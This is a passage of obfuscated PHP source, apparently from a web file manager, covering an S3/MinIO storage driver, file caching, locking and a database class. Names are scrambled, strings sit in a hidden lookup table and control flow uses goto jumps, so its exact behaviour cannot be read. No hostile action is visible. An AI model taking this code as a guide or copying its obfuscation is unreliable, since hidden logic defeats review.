} $Ç¡Ú½ÖÕ = $this->client->getObject($this->bucket, $ØƒÉÁûµ, array(), $ğéßšÜ); return $Ç¡Ú½ÖÕ !== !1 ? $ğéßšÜ : !1; } public function link($ë×¯ı¤°, $ã»şÂÄ¯ = array()) { $ıİÑ½± =& $_SERVER[ÏÒ Ì„]; if ($this->signVer == $ıİÑ½±[212]) { return $this->client->getAuthenticatedURL($this->bucket, $ë×¯ı¤°, 3600 * 12, $ã»şÂÄ¯); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($ë×¯ı¤°, $ıİÑ½±[8]), 3600 * 12, $this->region, array(), !0, $ã»şÂÄ¯); } public function fileOut($Ğ±ÃÆÆ, $îÖÅèåÁ = false, $´Äê™ü = false, $Ö£ã­·î = '') { $Üôæ•Ãƒ =& $_SERVER[ÏÒ Ì„]; if ($this->isFileOutServer()) { return $this->fileOutServer($Ğ±ÃÆÆ, $îÖÅèåÁ, $´Äê™ü, $Ö£ã­·î); } if (!$´Äê™ü) { $´Äê™ü = $this->pathThis($Ğ±ÃÆÆ); } $ƒßùÇ§ = get_file_mime(get_path_ext($´Äê™ü)); if ($ƒßùÇ§ == $Üôæ•Ãƒ[213]) { return parent::fileOut($Ğ±ÃÆÆ, $îÖÅèåÁ, $´Äê™ü, $Ö£ã­·î); } $îÖÅèåÁ = $îÖÅèåÁ ? $Üôæ•Ãƒ[214] : $Üôæ•Ãƒ[215]; $İ³Ø¯—‡ = array($Üôæ•Ãƒ[216] => $îÖÅèåÁ . $Üôæ•Ãƒ[217] . rawurlencode($´Äê™ü), $Üôæ•Ãƒ[218] => $ƒßùÇ§); $´å–íœ = $this->link($Ğ±ÃÆÆ, $İ³Ø¯—‡); $this->fileOutLink($´å–íœ); } public function fileOutServer($òÑ„™ú, $¥ŞËŠ© = false, $³Û»•†ß = false, $‘™øãƒ = '') { parent::fileOut($òÑ„™ú, $¥ŞËŠ©, $³Û»•†ß, $‘™øãƒ); } public function fileOutImageServer($ûšäÓ, $áûŒüÙ¨ = 250) { parent::fileOutImage($ûšäÓ, $áûŒüÙ¨); } public function hashMd5($³®–Ëé, $»–¡»Ü÷ = '') { $Ø§¿¢°Ù =& $_SERVER[ÏÒ Ì„]; $äÁĞÖ×— = $this->objectMeta($³®–Ëé); if (!$äÁĞÖ×—) { return !1; } $»–¡»Ü÷ = $»–¡»Ü÷ ? $»–¡»Ü÷ : _get($äÁĞÖ×—, $Ø§¿¢°Ù[219]); $»–¡»Ü÷ = $»–¡»Ü÷ ? $»–¡»Ü÷ : _get($äÁĞÖ×—, $Ø§¿¢°Ù[209], $Ø§¿¢°Ù[33]); return $»–¡»Ü÷; } public function uploadFormData($¹¨·Ş™Ò, $ê´Œ¥åà = 3600) { $ÜîĞ„­‰ =& $_SERVER[ÏÒ Ì„]; $÷Ù…—‰À = $this->pathFather($¹¨·Ş™Ò); $ÊØ÷®›Æ = $this->client->getHttpUploadPostParams($this->bucket, $÷Ù…—‰À, $ÜîĞ„­‰[192], $ê´Œ¥åà); return array_merge((array) $ÊØ÷®›Æ, array($ÜîĞ„­‰[175] => $this->getHost())); } public function multiUploadFormData($Æ‡­èÚ, $‘ÊğÆÃá = 3600) { $êûå³û© =& $_SERVER[ÏÒ Ì„]; $ğ¨¥ä¡ä = gmdate($êûå³û©[220]); $™á€ÏÏ = array(); $ÛÅŠÌ²‚ = $this->client->getUploadId($this->bucket, $Æ‡­èÚ, $™á€ÏÏ); if (!$ÛÅŠÌ²‚) { return !1; } return array($êûå³û©[221] => $ÛÅŠÌ²‚, $êûå³û©[175] => $this->getHost() . $êûå³û©[8] . $this->pathEncode($Æ‡­èÚ), $êûå³û©[222] => $ğ¨¥ä¡ä, $êûå³û©[93] => $Æ‡­èÚ); } public function multiUploadAuthData($í¹±»Ù…, $Ğ«ÊÔîõ = array()) { $°ş€ÑšÒ =& $_SERVER[ÏÒ Ì„]; $Ÿèò–Š = isset($Ğ«ÊÔîõ[$°ş€ÑšÒ[222]]) ? $Ğ«ÊÔîõ[$°ş€ÑšÒ[222]] : gmdate($°ş€ÑšÒ[220]); $ğ©“ºƒ = isset($Ğ«ÊÔîõ[$°ş€ÑšÒ[168]]) ? $Ğ«ÊÔîõ[$°ş€ÑšÒ[168]] : $°ş€ÑšÒ[33]; $íØÂŒ“ = $Ğ«ÊÔîõ[$°ş€ÑšÒ[93]]; unset($Ğ«ÊÔîõ[$°ş€ÑšÒ[93]]); if (isset($Ğ«ÊÔîõ[$°ş€ÑšÒ[223]])) { $Ğ«ÊÔîõ[$°ş€ÑšÒ[222]] = $Ÿèò–Š; return $this->listUploadParts($íØÂŒ“, $Ğ«ÊÔîõ); } $…Ú¿¤éı = array($°ş€ÑšÒ[224], $°ş€ÑšÒ[33], $°ş€ÑšÒ[119], $°ş€ÑšÒ[33], "\x78\55\141\155\x7a\x2d\144\141\164\x65\72{$Ÿèò–Š}", $°ş€ÑšÒ[8] . $this->bucket . $°ş€ÑšÒ[8] . $this->pathEncode($íØÂŒ“) . $ğ©“ºƒ); if (strpos($ğ©“ºƒ, $°ş€ÑšÒ[225]) === 0) { $…Ú¿¤éı[0] = $°ş€ÑšÒ[226]; } if (isset($Ğ«ÊÔîõ[$°ş€ÑšÒ[227]]) && $Ğ«ÊÔîõ[$°ş€ÑšÒ[227]] == $°ş€ÑšÒ[228]) { $…Ú¿¤éı[0] = $°ş€ÑšÒ[228]; } $²®Û×µÚ = implode($°ş€ÑšÒ[229], $…Ú¿¤éı); $®úüß· = base64_encode(hash_hmac($°ş€ÑšÒ[230], $²®Û×µÚ, $this->secret, !0)); $´¢³Ñ©º = $°ş€ÑšÒ[231] . $this->accessKey . $°ş€ÑšÒ[4] . $®úüß·; if (strpos($ğ©“ºƒ, $°ş€ÑšÒ[225]) === 0) { return array($°ş€ÑšÒ[232] => $´¢³Ñ©º, $°ş€ÑšÒ[222] => $Ÿèò–Š); } return $´¢³Ñ©º; } public function listUploadParts($Ù¢ê–ç, $×»à¨Íı = array()) { $Ü«ç¿Õâ =& $_SERVER[ÏÒ Ì„]; $¸íªÏü = str_replace($Ü«ç¿Õâ[233], $Ü«ç¿Õâ[33], $×»à¨Íı[$Ü«ç¿Õâ[168]]); $ŞÏâ€Ñ˜ = $this->client->listParts($this->bucket, $Ù¢ê–ç, $¸íªÏü); if (!$ŞÏâ€Ñ˜) { return !1; } unset($×»à¨Íı[$Ü«ç¿Õâ[223]], $×»à¨Íı[$Ü«ç¿Õâ[227]]); $×»à¨Íı[$Ü«ç¿Õâ[93]] = $Ù¢ê–ç; $ó¹ìäëÕ = $this->multiUploadAuthData($Ù¢ê–ç, $×»à¨Íı); if (empty($ó¹ìäëÕ)) { return !1; } return array($Ü«ç¿Õâ[232] => $ó¹ìäëÕ, $Ü«ç¿Õâ[222] => $×»à¨Íı[$Ü«ç¿Õâ[222]], $Ü«ç¿Õâ[234] => $ŞÏâ€Ñ˜); } public function getHost() { return parent::getHost() . $_SERVER[ÏÒ Ì„][8] . $this->bucket; } public function size($ïì¢²³) { $Õ»Ã«‚¯ = $this->objectMeta($ïì¢²³); return $Õ»Ã«‚¯ ? $Õ»Ã«‚¯[$_SERVER[ÏÒ Ì„][78]] : 0; } public function info($ñ™ı¤•) { if ($this->isFolder($ñ™ı¤•)) { return $this->folderInfo($ñ™ı¤•); } else { if ($this->isFile($ñ™ı¤•)) { return $this->fileInfo($ñ™ı¤•); } } return !1; } public function exist($ñ´Èå£ç) { return $this->isFile($ñ´Èå£ç) || $this->isFolder($ñ´Èå£ç); } public function isFile($ÂóşŞíÎ) { return !$this->isFolder($ÂóşŞíÎ) && $this->objectMeta($ÂóşŞíÎ); } public function isFolder($¿æ¼ˆĞË) { return $this->cacheMethod($_SERVER[ÏÒ Ì„][199], $¿æ¼ˆĞË); } protected function objectMeta($İô¹Ò¹©) { return $this->cacheMethod($_SERVER[ÏÒ Ì„][200], $İô¹Ò¹©); } protected function _objectMeta($ø¾Ù”¿Ì) { $²ôÍÆ¦‰ =& $_SERVER[ÏÒ Ì„]; $ø¾Ù”¿Ì = rtrim($ø¾Ù”¿Ì, $²ôÍÆ¦‰[8]); try { $Ü•ÖÔ¨ = $this->client->getObjectInfo($this->bucket, $ø¾Ù”¿Ì); if (!isset($Ü•ÖÔ¨[$²ôÍÆ¦‰[219]]) && isset($Ü•ÖÔ¨[$²ôÍÆ¦‰[235]])) { $Ü•ÖÔ¨[$²ôÍÆ¦‰[219]] = $Ü•ÖÔ¨[$²ôÍÆ¦‰[235]]; } } catch (Exception $×Àöí¼) { $Ü•ÖÔ¨ = !1; } if (!$Ü•ÖÔ¨) { } return $Ü•ÖÔ¨; } protected function _isFolder($äçÀõŠ) { $€éÅöÔ =& $_SERVER[ÏÒ Ì„]; $äçÀõŠ = rtrim($äçÀõŠ, $€éÅöÔ[8]); if ($äçÀõŠ == $€éÅöÔ[33] || $äçÀõŠ == $€éÅöÔ[8]) { return !0; } $’÷ù–×ı = $this->client->getBucket($this->bucket, $äçÀõŠ, null, 1); if (empty($’÷ù–×ı[$€éÅöÔ[198]])) { return !1; } $³½ğ¶ƒã = $’÷ù–×ı[$€éÅöÔ[198]][0][$€éÅöÔ[28]]; return stripos($³½ğ¶ƒã, $äçÀõŠ . $€éÅöÔ[8]) === 0 ? !0 : !1; if (substr($³½ğ¶ƒã, -1) == $€éÅöÔ[8]) { return !0; } if (get_path_this($³½ğ¶ƒã) == get_path_this($äçÀõŠ)) { return !1; } return !0; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($óÅƒÇúö) { parent::__construct($óÅƒÇúö); $this->signatureVersion($_SERVER[ÏÒ Ì„][212]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto dˆ›æÙ¹‰Ù; A—ŞÔùêÁÍ: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($•ÎµÑÄ¶, $Ş’É¾ú) { $¿ óë‡ =& $_SERVER[ÏÒ Ì„]; $this->cachePath = $•ÎµÑÄ¶[$¿ óë‡[76]]; $this->prefix = $¿ óë‡[831]; $this->cacheTime = $Ş’É¾ú; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($Æ”ÏéŸÏ) { $¡­ÀÒúª =& $_SERVER[ÏÒ Ì„]; $Æ”ÏéŸÏ = str_replace(array($¡­ÀÒúª[832], $¡­ÀÒúª[97], $¡­ÀÒúª[70]), $¡­ÀÒúª[833], $Æ”ÏéŸÏ); return $this->cachePath . $¡­ÀÒúª[834] . $Æ”ÏéŸÏ . $¡­ÀÒúª[835]; } public function set($ÇÁÀÓ«, $ú…ìéû¯, $àˆ…ñ…Å = false) { $°¡Çñ¸Ø = $this->getFile($ÇÁÀÓ«); if (file_put_contents($°¡Çñ¸Ø, $this->prefix . $ú…ìéû¯, LOCK_EX)) { @touch($°¡Çñ¸Ø, intval(time() + $àˆ…ñ…Å)); clearstatcache(); return !0; } @unlink($°¡Çñ¸Ø); return !1; } public function get($ƒğ¦ï) { $‹ëæ„¨ò = $this->getFile($ƒğ¦ï); if (file_exists($‹ëæ„¨ò) && filemtime($‹ëæ„¨ò) < time()) { @unlink($‹ëæ„¨ò); return !1; } $ŒŠğÁô = @file_get_contents($‹ëæ„¨ò); return substr($ŒŠğÁô, strlen($this->prefix)); } public function remove($º’šÒª™) { $´§â‘Ö  = $this->getFile($º’šÒª™); return @unlink($´§â‘Ö ); } public function deleteAll() { $¹ºÒ¸Ù³ =& $_SERVER[ÏÒ Ì„]; $Õíİ„åé = scandir($this->cachePath); foreach ($Õíİ„åé as $šÁ¢ıÎù) { $‹ê®ô›ù = $this->cachePath . $šÁ¢ıÎù; if (strpos($‹ê®ô›ù, $¹ºÒ¸Ù³[835]) && strpos($‹ê®ô›ù, $¹ºÒ¸Ù³[836])) { @unlink($‹ê®ô›ù); } } } public function clearTimeout() { $éßÑ³à› =& $_SERVER[ÏÒ Ì„]; $¦ñ…½³Û = scandir($this->cachePath); foreach ($¦ñ…½³Û as $½ÖòÃÙö) { $©ŸÓÅÑ· = $this->cachePath . $½ÖòÃÙö; if (strpos($©ŸÓÅÑ·, $éßÑ³à›[835]) && strpos($©ŸÓÅÑ·, $éßÑ³à›[836]) && filemtime($©ŸÓÅÑ·) < time()) { @unlink($©ŸÓÅÑ·); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $ïîµ¯úË =& $_SERVER[ÏÒ Ì„]; if (self::$handle) { return self::$handle; } $ó£´İ¾É = $GLOBALS[$ïîµ¯úË[6]][$ïîµ¯úË[347]]; self::$timeout = $ó£´İ¾É[$ïîµ¯úË[837]] ? $ó£´İ¾É[$ïîµ¯úË[837]] : 10; $ë¿Õøºœ = _get($GLOBALS[$ïîµ¯úË[6]], $ïîµ¯úË[838]); $µÒœÈÌ½ = $ó£´İ¾É[$ïîµ¯úË[824]] ? $ó£´İ¾É[$ïîµ¯úË[824]] : $ïîµ¯úË[193]; if ($µÒœÈÌ½ == $ïîµ¯úË[17] && $ë¿Õøºœ == $ïîµ¯úË[9]) { $µÒœÈÌ½ = $ïîµ¯úË[193]; } switch ($µÒœÈÌ½) { case $ïîµ¯úË[827]: self::$handle = new CacheLockRedis(); break; case $ïîµ¯úË[828]: self::$handle = new CacheLockMemcached(); break; case $ïîµ¯úË[17]: self::$handle = new CacheLockDatabase(); break; case $ïîµ¯úË[193]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($ïîµ¯úË[839], $ïîµ¯úË[840]); } return self::$handle; } private static function key($ˆ—ªáêó) { return $_SERVER[ÏÒ Ì„][841] . Cache::key($ˆ—ªáêó); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($ŠÙ©ª“í = '') { self::$errorMsg = $ŠÙ©ª“í; } public static function lockGlobal($À“¸¾Ï», $¬èÊâÖĞ) { return self::lock($À“¸¾Ï», $¬èÊâÖĞ, !0); } public static function lock($Àâó­ÛÔ, $ÜëÚÎ¢² = false, $•°§†Š = false) { $‹ºŒ´Ó­ =& $_SERVER[ÏÒ Ì„]; $€ˆ©’²Î = self::init(); $ºó´£§Í = self::key($Àâó­ÛÔ); $ÜëÚÎ¢² = $ÜëÚÎ¢² ? $ÜëÚÎ¢² : self::$timeout; $ùÙ¬¸Ù = $€ˆ©’²Î->lock($ºó´£§Í, $ÜëÚÎ¢²); $ûâªË“ï = timeFloat(); if (!$ùÙ¬¸Ù) { $×Ù”¤›° = "\x6c\157\143\x6b\40\145\x72\x72\x6f\x72\73\153\x65\171\x3d{$Àâó­ÛÔ}\73\164\x69\x6d\x65\75{$ÜëÚÎ¢²}\73" . self::$errorMsg . $‹ºŒ´Ó­[68] . get_caller_msg(); $ÍãùÊÅ˜ = LNG($‹ºŒ´Ó­[842]) . "\50{$ÜëÚÎ¢²}\x73\51\56" . LNG($‹ºŒ´Ó­[843]); $ÍãùÊÅ˜ .= $‹ºŒ´Ó­[844]; if (is_string(self::$errorMsg) && self::$errorMsg) { $ÍãùÊÅ˜ = $ÍãùÊÅ˜ . $‹ºŒ´Ó­[845] . self::$errorMsg; } write_log($×Ù”¤›°, $‹ºŒ´Ó­[840]); show_json($ÍãùÊÅ˜, !1); } if (!$•°§†Š) { self::$lockItem[$ºó´£§Í] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $ó­ò³² = number_format(timeFloat() - $ûâªË“ï, 3); write_log($‹ºŒ´Ó­[846] . $Àâó­ÛÔ . $‹ºŒ´Ó­[847] . $ó­ò³², $‹ºŒ´Ó­[840]); } return $ùÙ¬¸Ù; } public static function lockGet($ÄˆºÑ†Å) { $ ç¯²úâ = self::key($ÄˆºÑ†Å); if (self::$lockItem[$ ç¯²úâ]) { return self::$lockItem[$ ç¯²úâ]; } return self::init()->lockGet($ ç¯²úâ); } public static function unlock($ãÅ’ó™¨) { $€“Ä’šõ =& $_SERVER[ÏÒ Ì„]; $ıîï‹˜¨ = self::key($ãÅ’ó™¨); self::$lockItem[$ıîï‹˜¨] = null; self::init()->unlock($ıîï‹˜¨); if (GLOBAL_DEBUG_LOG_ALL) { write_log($€“Ä’šõ[848] . $ãÅ’ó™¨, $€“Ä’šõ[840]); } return; } public static function unlockRuntime() { $Üâ¹Øòä =& $_SERVER[ÏÒ Ì„]; $ÍóÒÉÑš = self::init(); $Ğ—¢íÅ = !1; foreach (self::$lockItem as $Ùğƒ¶î => $æÛš”Í) { if (!$æÛš”Í) { continue; } $ÍóÒÉÑš->unlock($Ùğƒ¶î); if (!$Ğ—¢íÅ) { $Ğ—¢íÅ = !0; write_log($Üâ¹Øòä[849] . $Ùğƒ¶î . $Üâ¹Øòä[68] . get_caller_msg(), $Üâ¹Øòä[840]); continue; } write_log($Üâ¹Øòä[849] . $Ùğƒ¶î, $Üâ¹Øòä[840]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $×ŸßÏà = number_format(timeFloat() - TIME_FLOAT, 3); write_log($Üâ¹Øòä[850] . $×ŸßÏà . $Üâ¹Øòä[851] . ACTION, $Üâ¹Øòä[840]); } } public static function fileLock($Ì’İ³‚) { $Õ¶° Ó— =& $_SERVER[ÏÒ Ì„]; if (!$GLOBALS[$Õ¶° Ó—[852]]) { $GLOBALS[$Õ¶° Ó—[852]] = array(); } $GLOBALS[$Õ¶° Ó—[852]][$Ì’İ³‚] = !1; $Áí„ÍÒ = fopen(DATA_PATH . $Ì’İ³‚ . $Õ¶° Ó—[853], $Õ¶° Ó—[854]); if (!$Áí„ÍÒ) { return !1; } $GLOBALS[$Õ¶° Ó—[852]][$Ì’İ³‚] = $Áí„ÍÒ; if (flock($Áí„ÍÒ, LOCK_EX)) { return !0; } self::unlock($Ì’İ³‚); show_json($Õ¶° Ó—[855], !1); return !1; } public static function fileUnlock($÷€Ú»Û¦) { $¦û¦›úò =& $_SERVER[ÏÒ Ì„]; $„‡¡òÎô = $GLOBALS[$¦û¦›úò[852]][$÷€Ú»Û¦]; if (!$„‡¡òÎô) { return; } $GLOBALS[$¦û¦›úò[852]][$÷€Ú»Û¦] = !1; flock($„‡¡òÎô, LOCK_UN); fclose($„‡¡òÎô); } public static function fileUnlockAll() { $±×Ö´¬ =& $_SERVER[ÏÒ Ì„]; if (!$GLOBALS[$±×Ö´¬[852]]) { return; } foreach ($GLOBALS[$±×Ö´¬[852]] as $İ‡ËŒ« => $æÀË¢‰˜) { if (!$æÀË¢‰˜) { continue; } $GLOBALS[$±×Ö´¬[852]][$İ‡ËŒ«] = !1; flock($æÀË¢‰˜, LOCK_UN); fclose($æÀË¢‰˜); } $GLOBALS[$±×Ö´¬[852]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto e‘À±ëšù®; bæ·ƒâÎ: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\150\151\156\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\161" => "\75", "\x6e\145\161" => "\x3c\x3e", "\x67\x74" => "\76", "\145\x67\x74" => "\x3e\75", "\x6c\164" => "\74", "\145\x6c\x74" => "\x3c\75", "\156\157\x74\154\151\x6b\145" => "\x4e\117\x54\x20\x4c\x49\x4b\105", "\154\x69\153\145" => "\114\111\113\105", "\151\156" => "\111\116", "\x6e\x6f\164\x69\156" => "\116\117\x54\40\111\116", "\x6e\157\164\x20\x69\156" => "\116\117\124\40\111\116", "\142\x65\x74\167\x65\x65\156" => "\x42\x45\124\127\105\x45\116", "\156\x6f\x74\142\145\x74\167\145\145\x6e" => "\116\117\124\x20\102\x45\x54\x57\x45\x45\116", "\x6e\x6f\x74\x20\142\145\x74\x77\x65\145\156" => "\x4e\117\124\x20\102\105\124\x57\x45\x45\x4e"); protected $selectSql = "\123\x45\114\x45\x43\124\45\104\x49\123\x54\111\116\103\124\45\x20\45\x46\x49\105\114\x44\45\x20\x46\x52\x4f\115\x20\x25\124\x41\x42\x4c\105\45\x25\x4a\117\x49\x4e\45\45\127\110\105\122\x45\x25\x25\107\x52\x4f\125\120\x25\45\110\x41\126\111\116\x47\45\45\x4f\x52\104\105\122\45\45\114\x49\x4d\111\x54\45\40\x25\x55\116\111\117\x4e\45\x25\x43\117\115\115\105\116\124\45"; protected $bind = array(); public static function getInstance() { $¨˜ôÍÊ§ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[ÏÒ Ì„][956], $¨˜ôÍÊ§); } public function factory($ò§®òÛ = '') { $ÙÛ‚‡ÑÏ =& $_SERVER[ÏÒ Ì„]; $ò§®òÛ = $this->parseConfig($ò§®òÛ); if (empty($ò§®òÛ[$ÙÛ‚‡ÑÏ[957]])) { think_exception(think_lang($ÙÛ‚‡ÑÏ[958])); } $this->dbType = ucwords(strtolower($ò§®òÛ[$ÙÛ‚‡ÑÏ[957]])); $³ÅÓÑ—Í = $ÙÛ‚‡ÑÏ[959] . $this->dbType; if (class_exists($³ÅÓÑ—Í)) { $¿¦Ç³ = new $³ÅÓÑ—Í($ò§®òÛ); if ($ÙÛ‚‡ÑÏ[787] != strtolower($ò§®òÛ[$ÙÛ‚‡ÑÏ[957]])) { $¿¦Ç³->dbType = strtoupper($this->dbType); } else { $¿¦Ç³->dbType = $this->_getDsnType($ò§®òÛ[$ÙÛ‚‡ÑÏ[912]]); } } else { think_exception(think_lang($ÙÛ‚‡ÑÏ[960]) . $ÙÛ‚‡ÑÏ[961] . $³ÅÓÑ—Í); } return $¿¦Ç³; } public function __call($«Ÿ’öåò, $ƒû¯¯Ï×) { if (method_exists($this, $«Ÿ’öåò)) { return call_user_func_array(array($this, $«Ÿ’öåò), $ƒû¯¯Ï×); } } protected function _getDsnType($äğ’ã§²) { $ğ’Õ‰şŠ = explode($_SERVER[ÏÒ Ì„][4], $äğ’ã§²); $®Ìæœƒš = strtoupper(trim($ğ’Õ‰şŠ[0])); return $®Ìæœƒš; } private function parseConfig($¬±›—Õ = '') { $İŸŸ“• =& $_SERVER[ÏÒ Ì„]; if (!empty($¬±›—Õ) && is_string($¬±›—Õ)) { $¬±›—Õ = $this->parseDSN($¬±›—Õ); } elseif (is_array($¬±›—Õ)) { $¬±›—Õ = array_change_key_case($¬±›—Õ); $¬±›—Õ = array($İŸŸ“•[957] => $¬±›—Õ[$İŸŸ“•[786]], $İŸŸ“•[885] => $¬±›—Õ[$İŸŸ“•[962]], $İŸŸ“•[886] => $¬±›—Õ[$İŸŸ“•[963]], $İŸŸ“•[883] => $¬±›—Õ[$İŸŸ“•[964]], $İŸŸ“•[884] => $¬±›—Õ[$İŸŸ“•[965]], $İŸŸ“•[17] => $¬±›—Õ[$İŸŸ“•[966]], $İŸŸ“•[912] => $¬±›—Õ[$İŸŸ“•[788]], $İŸŸ“•[13] => isset($¬±›—Õ[$İŸŸ“•[967]]) ? $¬±›—Õ[$İŸŸ“•[967]] : array()); } elseif (empty($¬±›—Õ)) { if (think_config($İŸŸ“•[968]) && $İŸŸ“•[787] != strtolower(think_config($İŸŸ“•[969]))) { $¬±›—Õ = $this->parseDSN(think_config($İŸŸ“•[968])); } else { $¬±›—Õ = array($İŸŸ“•[957] => think_config($İŸŸ“•[969]), $İŸŸ“•[885] => think_config($İŸŸ“•[970]), $İŸŸ“•[886] => think_config($İŸŸ“•[971]), $İŸŸ“•[883] => think_config($İŸŸ“•[972]), $İŸŸ“•[884] => think_config($İŸŸ“•[973]), $İŸŸ“•[17] => think_config($İŸŸ“•[244]), $İŸŸ“•[912] => think_config($İŸŸ“•[968]), $İŸŸ“•[13] => think_config($İŸŸ“•[974])); } } return $¬±›—Õ; } protected function initConnect($¸÷ºÍš = true) { if (1 == think_config($_SERVER[ÏÒ Ì„][18])) { $this->_linkID = $this->multiConnect($¸÷ºÍš); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $£öâ–Ô => $ñÄşĞÉ) { $this->_linkID = $ñÄşĞÉ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($º²á˜ªñ = false) { $–¦ÜïÄ =& $_SERVER[ÏÒ Ì„]; static $¬¾ªäÔ© = array(); static $§å¼Ÿ„ = -1; if (empty($¬¾ªäÔ©)) { foreach ($this->config as $ş È÷Ú¯ => $º÷ÇÔÃÇ) { $¬¾ªäÔ©[$ş È÷Ú¯] = explode($–¦ÜïÄ[47], $º÷ÇÔÃÇ); } } if (think_config($–¦ÜïÄ[975])) { if ($º²á˜ªñ || think_config($–¦ÜïÄ[391]) === !0) { $Ô¾µØÜ = floor(mt_rand(0, think_config($–¦ÜïÄ[976]) - 1)); $§å¼Ÿ„ = $Ô¾µØÜ; } else { if (is_numeric(think_config($–¦ÜïÄ[977]))) { $Ô¾µØÜ = think_config($–¦ÜïÄ[977]); } else { $Ô¾µØÜ = floor(mt_rand(think_config($–¦ÜïÄ[976]), count($¬¾ªäÔ©[$–¦ÜïÄ[883]]) - 1)); } } } else { $Ô¾µØÜ = floor(mt_rand(0, count($¬¾ªäÔ©[$–¦ÜïÄ[883]]) - 1)); $§å¼Ÿ„ = $Ô¾µØÜ; } $Ô¾µØÜ = $§å¼Ÿ„ !== -1 ? $§å¼Ÿ„ : $Ô¾µØÜ; $ä¼½×Ğ = array($–¦ÜïÄ[885] => isset($¬¾ªäÔ©[$–¦ÜïÄ[885]][$Ô¾µØÜ]) ? $¬¾ªäÔ©[$–¦ÜïÄ[885]][$Ô¾µØÜ] : $¬¾ªäÔ©[$–¦ÜïÄ[885]][0], $–¦ÜïÄ[886] => isset($¬¾ªäÔ©[$–¦ÜïÄ[886]][$Ô¾µØÜ]) ? $¬¾ªäÔ©[$–¦ÜïÄ[886]][$Ô¾µØÜ] : $¬¾ªäÔ©[$–¦ÜïÄ[886]][0], $–¦ÜïÄ[883] => isset($¬¾ªäÔ©[$–¦ÜïÄ[883]][$Ô¾µØÜ]) ? $¬¾ªäÔ©[$–¦ÜïÄ[883]][$Ô¾µØÜ] : $¬¾ªäÔ©[$–¦ÜïÄ[883]][0], $–¦ÜïÄ[884] => isset($¬¾ªäÔ©[$–¦ÜïÄ[884]][$Ô¾µØÜ]) ? $¬¾ªäÔ©[$–¦ÜïÄ[884]][$Ô¾µØÜ] : $¬¾ªäÔ©[$–¦ÜïÄ[884]][0], $–¦ÜïÄ[17] => isset($¬¾ªäÔ©[$–¦ÜïÄ[17]][$Ô¾µØÜ]) ? $¬¾ªäÔ©[$–¦ÜïÄ[17]][$Ô¾µØÜ] : $¬¾ªäÔ©[$–¦ÜïÄ[17]][0], $–¦ÜïÄ[912] => isset($¬¾ªäÔ©[$–¦ÜïÄ[912]][$Ô¾µØÜ]) ? $¬¾ªäÔ©[$–¦ÜïÄ[912]][$Ô¾µØÜ] : $¬¾ªäÔ©[$–¦ÜïÄ[912]][0], $–¦ÜïÄ[13] => isset($¬¾ªäÔ©[$–¦ÜïÄ[13]][$Ô¾µØÜ]) ? $¬¾ªäÔ©[$–¦ÜïÄ[13]][$Ô¾µØÜ] : $¬¾ªäÔ©[$–¦ÜïÄ[13]][0]); return $this->connect($ä¼½×Ğ, $Ô¾µØÜ); } public function parseDSN($§ªÔÆğ×) { $ñåöÎñ =& $_SERVER[ÏÒ Ì„]; if (empty($§ªÔÆğ×)) { return !1; } $Ç†–˜‡ = parse_url($§ªÔÆğ×); if ($Ç†–˜‡[$ñåöÎñ[174]]) { $‘ìıªş– = array($ñåöÎñ[957] => $Ç†–˜‡[$ñåöÎñ[174]], $ñåöÎñ[885] => isset($Ç†–˜‡[$ñåöÎñ[588]]) ? $Ç†–˜‡[$ñåöÎñ[588]] : $ñåöÎñ[33], $ñåöÎñ[886] => isset($Ç†–˜‡[$ñåöÎñ[978]]) ? $Ç†–˜‡[$ñåöÎñ[978]] : $ñåöÎñ[33], $ñåöÎñ[883] => isset($Ç†–˜‡[$ñåöÎñ[175]]) ? $Ç†–˜‡[$ñåöÎñ[175]] : $ñåöÎñ[33], $ñåöÎñ[884] => isset($Ç†–˜‡[$ñåöÎñ[176]]) ? $Ç†–˜‡[$ñåöÎñ[176]] : $ñåöÎñ[33], $ñåöÎñ[17] => isset($Ç†–˜‡[$ñåöÎñ[76]]) ? substr($Ç†–˜‡[$ñåöÎñ[76]], 1) : $ñåöÎñ[33]); } else { preg_match($ñåöÎñ[979], trim($§ªÔÆğ×), $ °“”Ì´); $‘ìıªş– = array($ñåöÎñ[957] => $ °“”Ì´[1], $ñåöÎñ[885] => $ °“”Ì´[2], $ñåöÎñ[886] => $ °“”Ì´[3], $ñåöÎñ[883] => $ °“”Ì´[4], $ñåöÎñ[884] => $ °“”Ì´[5], $ñåöÎñ[17] => $ °“”Ì´[6]); } $‘ìıªş–[$ñåöÎñ[912]] = $ñåöÎñ[33]; return $‘ìıªş–; } protected function debug() { $‹ÖËĞË =& $_SERVER[ÏÒ Ì„]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $‹ÖËĞË[980]; if (think_config($‹ÖËĞË[981])) { think_status($‹ÖËĞË[982]); think_trace($this->queryStr . $‹ÖËĞË[983] . think_status($‹ÖËĞË[20], $‹ÖËĞË[982], 6) . $‹ÖËĞË[984], $‹ÖËĞË[33], $‹ÖËĞË[985]); } } protected function parseLock($Ì¥ëªã  = false) { $“û–İ»Á =& $_SERVER[ÏÒ 